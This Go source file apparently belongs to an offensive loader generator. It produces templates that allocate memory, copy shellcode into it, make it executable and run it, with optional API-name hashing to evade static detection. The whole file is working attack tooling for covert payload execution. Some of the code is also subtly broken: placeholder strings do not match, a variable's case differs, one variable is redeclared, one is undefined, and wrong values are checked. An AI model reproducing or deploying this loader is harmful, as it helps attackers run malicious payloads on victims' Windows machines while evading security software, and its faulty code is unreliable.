package loaders

import (
	"fmt"
	"github.com/cmepw/myph/v2/cli"
	"strings"
)

type SyscallTemplate struct {
	UseApiHashing bool
	HashMethod    cli.ApiHashTechnique
}

func (t SyscallTemplate) Import() string {
	if t.UseApiHashing {
		return fmt.Sprintf(`
import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)
        `)

	}

	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t SyscallTemplate) Const() string {

	if t.UseApiHashing {
		return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)
`)

	}

	return fmt.Sprintf(`
const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

var (
	ntdll = syscall.MustLoadDLL("ntdll.dll")

	VirtualAllocEx = ntdll.MustFindProc("VirtualAllocEx")
	VirtualProtectEx = ntdll.MustFindProc("VirtualProtectEx")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

`)
}

func (t SyscallTemplate) Init() string {
	return fmt.Sprintf("\n")
}

func (t SyscallTemplate) Process() string {
	if t.UseApiHashing {

		/*
			FIXME(djnn): reading ntdll or kernel32 from disk sucks, we should recover it from PEB instead
			but i will address this later

			also, we should probably only read from ntdll
		*/

		hashedVirtualAllocEx := t.HashMethod.HashItem("VirtualAllocEx")
		hashedVirtualProtectEx := t.HashMethod.HashItem("VirtualProtectEx")
		hashedRtlCopyMemory := t.HashMethod.HashItem("RtlCopyMemory")

		hashedMethod := t.HashMethod.String()

		template := fmt.Sprintf(`

    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()

    var addr uintptr
	regionsize := uintptr(len(shellcode))
    VirtualAllocEx, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALALLOCEX__", kernel32)
	if err != nil {
		log.Fatal(err)
	}

    addr = loader.HashedCall(
        VirtualAllocEx,
		syscall.InvalidHandle,
        0,
        regionSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )

    if addr == 0 {
        log.Fatal("Error: null return value")
    }

    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "_HASHED_RTLCOPYMEMORY__", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        RtlCopyMemory,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        regionsize,
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    oldProtect := PAGE_READWRITE
    VirtualProtectEx, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALPROTECTEX__", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        VirtualProtectEx,
		syscall.InvalidHandle,
        addr,
        regionsize,
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    _, _, err = syscall.SyscallN(addr)
	if err != nil { 
		log.Fatal(err)
	}

        `)

		template = strings.ReplaceAll(template, "__HASH__METHOD__", hashedMethod)
		template = strings.ReplaceAll(template, "__HASHED__VIRTUALPROTECTEX__", hashedVirtualProtectEx)
		template = strings.ReplaceAll(template, "__HASHED__VIRTUALALLOCEX__", hashedVirtualAllocEx)
		template = strings.ReplaceAll(template, "__HASHED__RTLCOPYMEMORY__", hashedRtlCopyMemory)
		return template
	}

	// syscall.InvalidHandle means self for windows
	return fmt.Sprintf(`
	addr, _, _ := VirtualAllocEx.Call(syscall.InvalidHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtectEx.Call(syscall.InvalidHandle,  addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = syscall.SyscallN(addr)
`)
}

func (t SyscallTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__

__IMPORT__PROCESS__

}
`
	template = strings.ReplaceAll(template, "__IMPORT__STATEMENT__", t.Import())
	template = strings.ReplaceAll(template, "__CONST__STATEMENT__", t.Const())
	template = strings.ReplaceAll(template, "__IMPORT__INIT__", t.Init())
	template = strings.ReplaceAll(template, "__IMPORT__PROCESS__", t.Process())

	return template
}
